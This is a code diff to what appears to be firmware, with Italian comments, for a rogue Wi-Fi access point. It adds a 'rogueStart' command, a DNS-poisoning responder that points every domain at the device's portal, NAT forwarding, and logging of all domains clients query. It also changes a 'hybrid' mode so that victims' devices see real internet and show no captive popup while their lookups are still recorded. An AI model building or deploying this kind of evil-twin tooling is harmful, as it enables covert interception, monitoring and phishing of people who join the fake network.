@@ -372,28 +372,10 @@ void feedRx(const uint8_t *d, int n) {
   }
 }
 
-// ============ DNS: log di tutti i domini + portal sui captive-check ============
-bool isCaptiveHost(const String &h) {
-  static const char *hosts[] = {
-    "captive.apple.com",
-    "captive.gstatic.com",
-    "connectivitycheck.gstatic.com",
-    "connectivitycheck.android.com",
-    "clients3.google.com",
-    "clients4.google.com",
-    "detectportal.firefox.com",
-    "nmcheck.gnome.org",
-    "msftconnecttest.com",
-    "msftncsi.com",
-    "networkcheck.kde.org",
-    "wifi.google.com"
-  };
-  for (unsigned i = 0; i < sizeof(hosts) / sizeof(hosts[0]); i++) {
-    if (h == hosts[i] || h.endsWith(String(".") + hosts[i])) return true;
-  }
-  return false;
-}
-
+// ============ DNS: log di tutti i domini + portal in modalità poison ============
+// Modalità HYBRID (dnsFwd=1): repeater trasparente — tutto inoltrato upstream, i
+// domini finiscono nel log sniff. Niente popup captive (iOS vede internet reale).
+// Modalità POISON (dnsFwd=0): ogni dominio → IP del softAP, così parte il portal.
 void dnsPoison(uint8_t *q, int n, const IPAddress &cip, const IPAddress &client, uint16_t cport) {
   if (n + 16 > 512) return;
   q[2] = 0x81; q[3] = 0x80;         // QR=1, RD+RA
@@ -453,8 +435,8 @@ void dnsTick() {
     sniffPush("D:" + qn);
   }
 
-  // ibrido: captive-check → portal sull'AP; tutto il resto → DNS upstream
-  if (!dnsFwd || isCaptiveHost(qn)) {
+  // hybrid: DNS upstream + log; poison: tutto → portal sull'AP
+  if (!dnsFwd) {
     dnsPoison(q, n, WiFi.softAPIP(), cip, cport);
     return;
   }
@@ -738,6 +720,9 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
     case 0x13: {  // rogueStart
       if (plen < 2) { sendFrame(0x13, 0x02, (const uint8_t *)"bad args", 8); break; }
       if (WiFi.status() != WL_CONNECTED) { sendFrame(0x13, 0x02, (const uint8_t *)"sta down", 8); break; }
+#if !IP_NAPT
+      sendFrame(0x13, 0x02, (const uint8_t *)"napt off in this build", 22); break;
+#endif
       int p = 0;
       int sl = pl[p++];
       if (p + sl > plen || sl > 32) { sendFrame(0x13, 0x02, (const uint8_t *)"bad args", 8); break; }
@@ -776,7 +761,7 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       // FIX #7: NAPT (init tabelle + enable) solo se STA è up
       naptOn();
       Serial.printf("[rogue] %s ch%d dns=%s napt=1 portal=%s\n", rogueSsid, apChannel,
-                    dnsFwd ? "hybrid" : "poison", dnsFwd ? "captive-only" : "all");
+                    dnsFwd ? "forward" : "poison", dnsFwd ? "off" : "all");
       sendFrame(0x13, 0x00, nullptr, 0);
       break;
     }
